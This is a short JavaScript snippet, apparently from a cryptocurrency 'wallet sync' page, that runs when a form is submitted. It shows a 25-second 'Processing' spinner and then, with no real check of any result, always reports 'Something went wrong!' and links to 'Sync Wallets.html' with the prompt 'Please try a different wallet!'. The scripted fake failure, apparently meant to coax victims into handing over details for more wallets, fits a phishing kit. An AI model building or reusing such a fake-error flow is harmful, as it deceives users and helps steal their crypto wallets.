var form = document.getElementById('frmSubmit');
form.addEventListener('submit', sweetalert, );

function sweetalert() {
    let timerInterval
    Swal.fire({
        title: 'Processing !',
        html: 'Please wait...',
        timer: 25000,
        timerProgressBar: true,
        didOpen: () => {
            Swal.showLoading()
            const b = Swal.getHtmlContainer().querySelector('b')
            timerInterval = setInterval(() => {
                
            }, 100)
        },
        willClose: () => {
            clearInterval(timerInterval)
        }
    }).then((result) => {
        /* Read more about handling dismissals below */
        if (result.dismiss === Swal.DismissReason.timer) {
            Swal.fire({
                icon: 'error',
                title: 'Oops...',
                text: 'Something went wrong!',
                footer: '<a href="./Sync Wallets.html">Please try a different wallet!</a>'
            })
        }
    })
}